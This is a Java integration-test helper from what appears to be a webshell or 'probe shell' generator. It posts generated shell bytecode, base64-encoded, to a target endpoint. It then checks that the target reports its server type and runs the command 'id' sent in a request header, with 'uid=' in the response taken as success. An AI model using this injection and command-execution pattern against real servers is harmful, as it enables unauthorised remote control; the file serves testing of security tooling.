package com.reajason.javaweb.integration;

import com.reajason.javaweb.integration.probe.DetectionTool;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;
import lombok.SneakyThrows;
import okhttp3.*;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2025/8/8
 */
public class ProbeAssertion {

    @SneakyThrows
    public static void responseBytecodeIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Bytecode)
                .targetJreVersion(targetJreVersion)
                .debug(true)
                .shrink(true)
                .build();
        String reqParamName = "payload";
        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(server)
                .reqParamName(reqParamName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", probeResult.getShellBytesBase64Str())
                .add(reqParamName, DetectionTool.getServerDetection())
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .url(url + "/b64").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertEquals(server, response.body().string());
        }
    }

    @SneakyThrows
    public static void responseCommandIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Command)
                .debug(true)
                .shrink(true)
                .targetJreVersion(targetJreVersion)
                .build();
        String headerName = "X-Header";
        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(server)
                .reqHeaderName(headerName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
        String content = probeResult.getShellBytesBase64Str();
        RequestBody requestBody = new FormBody.Builder()
                .add("data", content)
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header(headerName, "id")
                .url(url + "/b64").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }
}
